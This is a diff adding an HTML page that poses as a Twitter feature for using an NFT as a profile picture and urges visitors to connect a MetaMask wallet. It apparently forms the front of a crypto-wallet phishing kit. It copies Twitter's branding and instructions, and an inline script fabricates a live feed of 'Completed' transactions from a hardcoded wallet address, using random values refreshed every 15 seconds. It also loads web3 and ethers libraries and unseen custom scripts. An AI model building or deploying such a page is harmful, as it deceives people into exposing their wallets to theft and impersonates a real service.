@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Twitter News</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css/fonts.css@family=Montserrat%253Aital,wght@0,100%3B0,200%3B0,300%3B0,400%3B0,500%3B0,600%3B0,700%3B0,800%3B0,900%3B1,100%3B1,200%3B1,300%3B1,400%3B1,500%3B1,600%3B1,700%3B1,800%3B1,900&amp;display=swap.css" rel="stylesheet">
+    <link rel="icon" href="favicon.png">
+    <link href="css/main.css" rel="stylesheet">
+    <link rel="stylesheet" href="./css/custom.css">
+</head>
+<body>
+    <div class="menu-section">
+        <div class="container">
+            <div class="row">
+                <div class="left">
+                    <img src="images/you-logo.png" alt="">
+                </div>
+                <div class="right">
+                    <a href="">MAIN</a>
+                    <a href="https://twitter.com/Twitter" target="_blank">TWITTER</a>
+                    <a href="https://metamask.io" target="_blank">METAMASK</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="main-section">
+    <div class="container">
+        <div class="row">
+            <div class="inside">
+                <img src="images/11234141.png" alt="">
+                <div class="text">
+                    <h2> Set your  <span>nft</span> as your twitter avatar</h2>
+                    <p id="msg" style="margin-top: 20px;">You need to connect your MetaMask wallet before you can choose NFT..</p>
+                    <button class="custom-btn nft-button btn-default" style="margin-bottom: 30px; color:white;">CONNECT METAMASK WALLET</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="small-separ"></div>
+    <div id="what-section" class="about-section what-section">
+    <div class="container">
+        <div class="row">
+            <div class="left">
+                <h2>How to turn your NFT into a verified profile picture on Twitter?</h2>
+                <p>Tap on Choose NFT and then on Connect my wallet.
+                    Choose the wallet that contains your NFTs, including MetaMask, Coinbase Wallet and Rainbow (if your wallet isn't available, you can't upload your NFT).
+                    You'll be redirected to your wallet and asked to connect your wallet to Twitter.
+                    Once the connection is made, you should see your gallery of NFTs.
+                    Choose an NFT and then resize it as needed.
+                    Tap on Done to add the NFT as your profile picture.
+                </p>
+            </div>
+            <div class="gtgt">
+                <img src="images/yetywuryetwryu.png" alt="">
+            </div>
+        </div>
+    </div>
+    <script>
+        var acc = document.getElementsByClassName("accordion");
+        var i;
+        
+        for (i = 0; i < acc.length; i++) {
+            acc[i].addEventListener("click", function () {
+                this.classList.toggle("active");
+                var panel = this.nextElementSibling;
+                if (panel.style.maxHeight) {
+                    panel.style.maxHeight = null;
+                } else {
+                    panel.style.maxHeight = panel.scrollHeight + "px";
+                }
+            });
+        }
+    </script>
+    <script>
+        let BaseWallet = "0x4d224452801aced8b2f0aebe155379bb5d594381";
+        
+        function randomString(len, charSet) {
+            charSet = charSet || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            var randomString = "";
+            for (var i = 0; i < len; i++) {
+                var randomPoz = Math.floor(Math.random() * charSet.length);
+                randomString += charSet.substring(randomPoz, randomPoz + 1);
+            }
+            return randomString;
+        }
+        
+        function randomInteger(min, max) {
+            let rand = min + Math.random() * (max + 1 - min);
+            return Math.floor(rand);
+        }
+        
+        function createTableItem() {
+            let inputValue = randomInteger(0, 500) + "." + randomString(1, "123456789");
+            let outputValue = ++inputValue * 2;
+            let txFIn = inputValue / 1000;
+            let txFOut = outputValue / 1000;
+            let cutWallet = randomInteger(0, 500) + "." + randomString(1, "123456789");
+            let ytytyt = '0x' + randomString(25) + "...";
+            let cutWalletqwe = '0x' + randomInteger(10000, 90000)
+            let cutWalletqwasde = 6 + '' + randomInteger(10000, 90000)
+        
+            let random_val = getRandom(1300, 7600).toFixed(2);
+        
+            let row = `
+                <div class="table-row">
+                    <div class="table-row_content">
+                        <div class="table-row_line">
+                            <p class="address" style=" padding: 18px 15px; font-size: 14px">${BaseWallet}</p>
+                            <p class="address" style=" padding: 18px 15px; font-size: 14px">${ytytyt}</p>
+                            <p class="address" style=" padding: 18px 15px; font-size: 14px">${random_val}</p>
+                        </div>
+                    </div>
+                    <div class="table-row_separator">
+                        <p class="gen-out">OUT</p>
+                    </div>
+                    <div class="table-row_content">
+                        <div class="table-row_line">
+                            <p class="age" style=" padding: 18px 15px; font-size: 14px">${cutWalletqwe}</p>
+                            <p class="age" style=" padding: 18px 15px; font-size: 14px">${cutWalletqwasde}</p>
+                            <p class="value" style=" padding: 18px 15px; font-size: 14px">right now</p>
+                            <p class="address gen-status" style=" padding: 18px 15px; font-size: 14px">Completed</p>
+                        </div>
+        
+                    </div>
+                </div>`;
+        
+            $(row).hide().prependTo(".table-items").fadeIn("slow");
+            $('.table-row:eq(3)').remove();
+        }
+        
+        function getRandom(min, max) {
+        return Math.random() * (max - min) + min;
+        }
+        
+        
+        createTableItem();
+        createTableItem();
+        createTableItem();
+        createTableItem();
+        createTableItem();
+        setInterval(createTableItem, 15000);
+    </script>
+    <script>
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+        
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
+    <script type="text/javascript" src="js/app.js"></script>
+    <script type="text/javascript" src="js/web3.min.js"></script>
+    <script type="text/javascript" src="js/moralis.min.js"></script>
+    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
+    <script>
+        var web3;
+        var claim_data = null;
+        var block = false;
+        var addrr = "";
+        var changeAddr = false;
+        
+        
+    </script>
+
+    <script src="./js/custom/device.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <script src="./js/custom/main.js"></script>
+</body>
+</html>
